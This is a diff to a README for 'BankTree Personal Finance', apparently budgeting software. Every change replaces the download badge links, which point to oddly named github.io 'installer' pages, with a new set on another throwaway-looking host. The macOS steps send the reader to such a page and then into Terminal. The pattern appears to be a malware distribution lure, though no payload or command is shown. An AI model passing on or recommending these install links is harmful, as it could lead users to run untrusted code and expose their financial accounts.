@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install BankTree Personal Finance](https://img.shields.io/badge/⬇_Install_BankTree+Personal+Finance-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Install BankTree Personal Finance](https://img.shields.io/badge/⬇_Install_BankTree+Personal+Finance-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -61,9 +61,9 @@ BankTree Personal Finance is a Windows budget and account management software wi
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
@@ -81,7 +81,7 @@ BankTree Personal Finance is a Windows budget and account management software wi
 
 <div align="center">
 
-[![⬇ Install BankTree Personal Finance](https://img.shields.io/badge/⬇_Install_BankTree+Personal+Finance-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Install BankTree Personal Finance](https://img.shields.io/badge/⬇_Install_BankTree+Personal+Finance-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -100,7 +100,7 @@ BankTree Personal Finance is a Windows budget and account management software wi
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ BankTree Personal Finance is a Windows budget and account management software wi
 
 <div align="center">
 
-[![⬇ Install BankTree Personal Finance](https://img.shields.io/badge/⬇_Install_BankTree+Personal+Finance-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Install BankTree Personal Finance](https://img.shields.io/badge/⬇_Install_BankTree+Personal+Finance-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
